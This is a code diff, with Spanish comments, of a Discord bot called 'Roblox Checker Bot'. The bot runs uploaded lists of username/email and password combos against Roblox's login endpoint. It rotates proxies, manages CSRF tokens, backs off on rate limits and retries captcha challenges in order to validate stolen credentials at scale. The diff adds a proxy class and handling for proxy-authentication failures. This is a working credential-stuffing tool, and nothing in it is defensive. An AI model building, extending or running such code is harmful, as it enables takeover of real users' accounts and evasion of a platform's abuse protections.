@@ -2,20 +2,18 @@
 """
 Roblox Checker Bot
 Comando: /rbx-checker  (file)
-Variables: DISCORD_TOKEN, CONCURRENCY, TIMEOUT, PROXY_SCHEME (todas opcionales salvo el token)
+Variables: DISCORD_TOKEN, CONCURRENCY, TIMEOUT, PROXY_SCHEME (opcionales salvo el token)
 """
 
 import asyncio
 import io
 import json
 import os
-import random
 import re
 import time
 from collections import deque
 from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
-from urllib.parse import urlsplit
 
 import aiohttp
 import discord
@@ -69,30 +67,71 @@ RAW_PROXIES = """
 """
 
 
-def _parse_proxies(raw: str) -> list[str]:
-    out = []
+# ------------------------------------------------------------------ proxies
+class Proxy:
+    __slots__ = ("host", "port", "user", "pw")
+
+    def __init__(self, host: str, port: str, user: str = "", pw: str = ""):
+        self.host = host
+        self.port = port
+        self.user = user
+        self.pw = pw
+
+    @property
+    def label(self) -> str:
+        base = f"{self.host}:{self.port}"
+        return f"{base}:{self.user}:{self.pw}" if self.user else base
+
+    @property
+    def url(self) -> str:
+        return f"{PROXY_SCHEME}://{self.host}:{self.port}"
+
+    @property
+    def auth(self):
+        if not self.user:
+            return None
+        return aiohttp.BasicAuth(self.user, self.pw)
+
+    @property
+    def con_auth(self) -> str:
+        if not self.user:
+            return self.url
+        return f"{PROXY_SCHEME}://{self.user}:{self.pw}@{self.host}:{self.port}"
+
+    def __eq__(self, otro):
+        return isinstance(otro, Proxy) and otro.label == self.label
+
+    def __hash__(self):
+        return hash(self.label)
+
+    def __repr__(self):
+        return f"<Proxy {self.label}>"
+
+
+def _parse_proxies(raw: str) -> list[Proxy]:
+    out: list[Proxy] = []
     for line in raw.strip().splitlines():
         line = line.strip()
-        if not line:
+        if not line or line.startswith("#"):
             continue
         parts = line.split(":")
         if len(parts) == 4:
-            host, port, user, pw = parts
-            out.append(f"{PROXY_SCHEME}://{user}:{pw}@{host}:{port}")
+            out.append(Proxy(parts[0], parts[1], parts[2], parts[3]))
         elif len(parts) == 2:
-            out.append(f"{PROXY_SCHEME}://{parts[0]}:{parts[1]}")
+            out.append(Proxy(parts[0], parts[1]))
     return out
 
 
-TODOS = _parse_proxies(RAW_PROXIES)
-PROXIES: list[str] = list(TODOS)
-MUERTOS: list[str] = []
+TODOS: list[Proxy] = _parse_proxies(RAW_PROXIES)
+PROXIES: list[Proxy] = list(TODOS)
+MUERTOS: list[Proxy] = []
+AUTH_FALLIDA: list[Proxy] = []
 PROXY_COOLDOWN: dict[str, float] = {}
 GLOBAL_COOLDOWN = 0.0
 _proxy_i = 0
 
 
-def next_proxy() -> str | None:
+def next_proxy() -> Proxy | None:
     global _proxy_i
     if not PROXIES:
         return None
@@ -100,22 +139,24 @@ def next_proxy() -> str | None:
     for _ in range(len(PROXIES)):
         _proxy_i = (_proxy_i + 1) % len(PROXIES)
         p = PROXIES[_proxy_i]
-        if PROXY_COOLDOWN.get(p, 0) <= ahora:
+        if PROXY_COOLDOWN.get(p.label, 0) <= ahora:
             return p
-    return min(PROXIES, key=lambda p: PROXY_COOLDOWN.get(p, 0))
+    return min(PROXIES, key=lambda p: PROXY_COOLDOWN.get(p.label, 0))
 
 
-def penalizar(proxy: str | None, segundos: float):
+def penalizar(proxy: Proxy | None, segundos: float):
     if proxy:
-        PROXY_COOLDOWN[proxy] = max(PROXY_COOLDOWN.get(proxy, 0), time.monotonic() + segundos)
+        PROXY_COOLDOWN[proxy.label] = max(
+            PROXY_COOLDOWN.get(proxy.label, 0), time.monotonic() + segundos
+        )
 
 
-async def wait_cooldown(proxy: str | None, job=None) -> bool:
+async def wait_cooldown(proxy: Proxy | None, job=None) -> bool:
     while True:
         if job and job.stopped:
             return False
         ahora = time.monotonic()
-        hasta = max(GLOBAL_COOLDOWN, PROXY_COOLDOWN.get(proxy, 0) if proxy else 0)
+        hasta = max(GLOBAL_COOLDOWN, PROXY_COOLDOWN.get(proxy.label, 0) if proxy else 0)
         left = hasta - ahora
         if left <= 0:
             return True
@@ -142,61 +183,81 @@ def retry_delay(r_headers) -> float:
 
 
 # ------------------------------------------------------------------ salud proxies
-async def _probar_proxy(url: str) -> bool:
-    partes = urlsplit(url)
-    host, port = partes.hostname, partes.port
-    if not host or not port:
-        return False
+async def _probar_proxy(p: Proxy) -> str:
+    """Devuelve 'ok', 'auth' (407) o 'muerto'."""
     try:
-        _, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=7)
-        writer.close()
-        try:
-            await writer.wait_closed()
-        except Exception:
-            pass
-        return True
+        if PROXY_SCHEME.startswith("socks") and ProxyConnector is not None:
+            connector = ProxyConnector.from_url(p.con_auth, rdns=True)
+            sesion = aiohttp.ClientSession(
+                headers=BASE_HEADERS,
+                connector=connector,
+                timeout=aiohttp.ClientTimeout(total=15, connect=8),
+            )
+        else:
+            sesion = aiohttp.ClientSession(
+                headers=BASE_HEADERS,
+                timeout=aiohttp.ClientTimeout(total=15, connect=8),
+                connector=aiohttp.TCPConnector(ssl=False),
+            )
+
+        async with sesion:
+            kwargs = {}
+            if not PROXY_SCHEME.startswith("socks"):
+                kwargs = {"proxy": p.url, "proxy_auth": p.auth}
+            async with sesion.post(LOGIN_URL, json={}, **kwargs) as r:
+                if r.status == 407:
+                    return "auth"
+                if r.status in (400, 401, 403, 429):
+                    return "ok"
+                return "ok" if r.status < 500 else "muerto"
     except Exception:
-        return False
+        return "muerto"
 
 
-async def health_check(silencioso: bool = False) -> tuple[int, int]:
+async def health_check(silencioso: bool = False) -> tuple[int, int, int]:
     global PROXIES
     if not TODOS:
-        return 0, 0
+        return 0, 0, 0
 
-    objetivo = MUERTOS if silencioso else TODOS
+    objetivo = MUERTOS + AUTH_FALLIDA if silencioso else TODOS
     if not objetivo:
-        return len(PROXIES), len(MUERTOS)
+        return len(PROXIES), 0, 0
 
     res = await asyncio.gather(*(_probar_proxy(p) for p in objetivo))
-    vivos = [p for p, ok in zip(objetivo, res) if ok]
-    caidos = [p for p, ok in zip(objetivo, res) if not ok]
+    ok = [p for p, r in zip(objetivo, res) if r == "ok"]
+    mal_auth = [p for p, r in zip(objetivo, res) if r == "auth"]
+    caidos = [p for p, r in zip(objetivo, res) if r == "muerto"]
 
     if silencioso:
-        for p in vivos:
-            MUERTOS.remove(p)
-            PROXY_COOLDOWN.pop(p, None)
-        PROXIES = [p for p in TODOS if p not in MUERTOS]
+        for p in ok:
+            if p in MUERTOS:
+                MUERTOS.remove(p)
+            if p in AUTH_FALLIDA:
+                AUTH_FALLIDA.remove(p)
+            PROXY_COOLDOWN.pop(p.label, None)
+        PROXIES = [p for p in TODOS if p not in MUERTOS and p not in AUTH_FALLIDA]
     else:
         MUERTOS[:] = caidos
-        PROXIES = vivos
+        AUTH_FALLIDA[:] = mal_auth
+        PROXIES = ok
 
     if not silencioso:
-        print(f"Health check: {len(vivos)}/{len(TODOS)} proxies responden")
+        print(f"Health check: {len(ok)}/{len(TODOS)} operativos")
         for p in caidos:
-            print(f"  muerto: {urlsplit(p).hostname}:{urlsplit(p).port}")
+            print(f"  sin conexión: {p.label}")
+        for p in mal_auth:
+            print(f"  credenciales rechazadas (407): {p.label}")
 
-    return len(PROXIES), len(MUERTOS)
+    return len(PROXIES), len(MUERTOS), len(AUTH_FALLIDA)
 
 
 async def health_loop():
     while True:
         await asyncio.sleep(HEALTH_EVERY)
         try:
-            if MUERTOS:
-                rec, _ = await health_check(silencioso=True)
-                if rec:
-                    print(f"Proxies recuperados, total vivos: {rec}")
+            if MUERTOS or AUTH_FALLIDA:
+                rec, _, _ = await health_check(silencioso=True)
+                print(f"Reintento de proxies, operativos ahora: {rec}")
         except Exception as e:
             print(f"health_loop: {e}")
 
@@ -299,10 +360,10 @@ class Worker:
             await self.session.close()
 
 
-async def _login(w: Worker, proxy: str | None, payload: dict):
-    """Devuelve (status, headers, body). Usa SOCKS si el esquema lo indica."""
-    if proxy and proxy.startswith("socks") and ProxyConnector is not None:
-        connector = ProxyConnector.from_url(proxy, rdns=True)
+async def _login(w: Worker, proxy: Proxy | None, payload: dict):
+    """Devuelve (status, headers, body). Credenciales siempre explícitas."""
+    if proxy and PROXY_SCHEME.startswith("socks") and ProxyConnector is not None:
+        connector = ProxyConnector.from_url(proxy.con_auth, rdns=True)
         async with aiohttp.ClientSession(
             headers=BASE_HEADERS,
             connector=connector,
@@ -314,14 +375,21 @@ async def _login(w: Worker, proxy: str | None, payload: dict):
             async with s.post(LOGIN_URL, json=payload, headers=h) as r:
                 return r.status, r.headers, await r.text()
 
-    csrf = w.csrf.get(proxy or "")
+    clave = proxy.label if proxy else "directo"
+    csrf = w.csrf.get(clave)
     if not csrf:
-        async with w.session.post(LOGIN_URL, json={}, proxy=proxy) as r:
+        async with w.session.post(
+            LOGIN_URL, json={}, proxy=proxy.url if proxy else None,
+            proxy_auth=proxy.auth if proxy else None,
+        ) as r:
             csrf = r.headers.get("x-csrf-token")
             if csrf:
-                w.csrf[proxy or ""] = csrf
+                w.csrf[clave] = csrf
     h = {"x-csrf-token": csrf} if csrf else {}
-    async with w.session.post(LOGIN_URL, json=payload, headers=h, proxy=proxy) as r:
+    async with w.session.post(
+        LOGIN_URL, json=payload, headers=h, proxy=proxy.url if proxy else None,
+        proxy_auth=proxy.auth if proxy else None,
+    ) as r:
         return r.status, r.headers, await r.text()
 
 
@@ -330,7 +398,7 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
     ctype = "Email" if "@" in user else "Username"
     payload = {"ctype": ctype, "cvalue": user, "password": pw}
 
-    cadena: list[str | None] = []
+    cadena: list[Proxy | None] = []
     if PROXIES:
         cadena.append(next_proxy())
         cadena.append(next_proxy())
@@ -354,7 +422,7 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
                 if intentos < 1:
                     intentos += 1
                     continue
-                return {"status": "error", "note": "timeout", "tipo": "timeout"}
+                return {"status": "error", "note": "timeout directo", "tipo": "timeout"}
             except aiohttp.ClientError as e:
                 penalizar(proxy, PROXY_PENALTY)
                 if proxy:
@@ -362,9 +430,18 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
                 if intentos < 1:
                     intentos += 1
                     continue
-                return {"status": "error", "note": type(e).__name__, "tipo": "proxy"}
+                return {"status": "error", "note": f"{type(e).__name__} directo", "tipo": "proxy"}
             except Exception as e:
                 return {"status": "error", "note": str(e)[:60], "tipo": "error"}
+
+            if status == 407:
+                penalizar(proxy, PROXY_PENALTY * 3)
+                w.csrf.pop(proxy.label if proxy else "directo", None)
+                if proxy and proxy not in AUTH_FALLIDA:
+                    AUTH_FALLIDA.append(proxy)
+                    if proxy in PROXIES:
+                        PROXIES.remove(proxy)
+                return {"status": "error", "note": "407 auth proxy", "tipo": "proxy"}
 
             if status == 200:
                 try:
@@ -377,7 +454,7 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
             if status == 403:
                 nuevo = headers.get("x-csrf-token")
                 if nuevo:
-                    w.csrf[proxy or ""] = nuevo
+                    w.csrf[proxy.label if proxy else "directo"] = nuevo
                 ctype_h = (headers.get("rblx-challenge-type") or "").lower()
                 challenge = headers.get("rblx-challenge-id")
                 low = body.lower()
@@ -389,7 +466,7 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
 
                 if intentos < 1:
                     intentos += 1
-                    w.csrf.pop(proxy or "", None)
+                    w.csrf.pop(proxy.label if proxy else "directo", None)
                     continue
                 return {"status": "bad", "note": "challenge", "tipo": "captcha"}
 
@@ -417,7 +494,7 @@ async def check_one(w: Worker, user: str, pw: str, job=None):
 
             return {"status": "error", "note": f"HTTP {status}", "tipo": "http"}
 
-    return {"status": "error", "note": "todos los proxies fallaron", "tipo": "proxy"}
+    return {"status": "error", "note": "cadena de proxies agotada", "tipo": "proxy"}
 
 
 # ------------------------------------------------------------------ job
@@ -472,7 +549,6 @@ class Job:
             self.errors.append(f"{combo}  # {res.get('note', 'error')}")
         tipo = res.get("tipo")
         if tipo:
-            nombre = "directo" if not PROXIES else ""
             self.log(tipo.upper(), f"{user} · {res.get('note') or tipo}")
         self.checked += 1
         self.ultimo_avance = time.monotonic()
@@ -532,7 +608,7 @@ class Job:
                 self.log(
                     "WARN",
                     f"sin avance {int(quieto)}s · {bloqueados} proxies en espera "
-                    f"· vivos {len(PROXIES)}/{len(TODOS)}",
+                    f"· operativos {len(PROXIES)}/{len(TODOS)}",
                 )
                 await self.refresh()
 
@@ -559,7 +635,7 @@ class Job:
         else:
             estado = "Checkeando"
         e.set_footer(
-            text=f"{estado} · {self.inflight} en vuelo · {len(PROXIES)}/{len(TODOS)} proxies vivos"
+            text=f"{estado} · {self.inflight} en vuelo · {len(PROXIES)}/{len(TODOS)} proxies operativos"
         )
         return e
 
@@ -574,11 +650,12 @@ class Job:
         e.add_field(name="Fatales", value=f"`{c['fatal']}`", inline=True)
 
         ahora = time.monotonic()
-        libres = sum(1 for p in PROXIES if PROXY_COOLDOWN.get(p, 0) <= ahora)
+        libres = sum(1 for p in PROXIES if PROXY_COOLDOWN.get(p.label, 0) <= ahora)
         e.add_field(
             name="Proxies",
             value=(
-                f"`{libres}/{len(PROXIES)}` libres · `{len(MUERTOS)}` muertos "
+                f"`{libres}/{len(PROXIES)}` libres · `{len(MUERTOS)}` caídos "
+                f"· `{len(AUTH_FALLIDA)}` auth rechazada "
                 f"· global `{max(GLOBAL_COOLDOWN - ahora, 0):.0f}s`"
             ),
             inline=False,
@@ -709,7 +786,10 @@ class ErrorsView(discord.ui.View):
             f"Checkeados: {self.job.done}",
             f"429: {self.job.contadores['429']} | captchas: {self.job.contadores['captcha']} "
             f"| timeouts: {self.job.contadores['timeout']} | proxies: {self.job.contadores['proxy']}",
-            f"Proxies vivos: {len(PROXIES)}/{len(TODOS)} | muertos: {len(MUERTOS)}",
+            f"Operativos: {len(PROXIES)}/{len(TODOS)} | caídos: {len(MUERTOS)} "
+            f"| auth rechazada: {len(AUTH_FALLIDA)}",
+            "Proxies configurados:",
+            *[f"  {p.label}" for p in TODOS],
             "-" * 40,
         ]
         await it.response.send_message(
@@ -734,10 +814,13 @@ async def sync_guild(guild: discord.Guild):
 
 @bot.event
 async def on_ready():
-    vivos, muertos = await health_check()
-    print(f"Proxies vivos: {vivos} | muertos: {muertos}")
+    print(f"Proxies cargados: {len(TODOS)}")
+    for p in TODOS:
+        print(f"  {p.label}")
+    vivos, muertos, mal_auth = await health_check()
+    print(f"Operativos: {vivos} | caídos: {muertos} | auth rechazada: {mal_auth}")
     if not vivos:
-        print("Sin proxies utilizables: el bot irá directo y esperará más captchas")
+        print("Sin proxies utilizables: el bot irá directo y comerá captchas")
 
     try:
         synced = await bot.tree.sync()
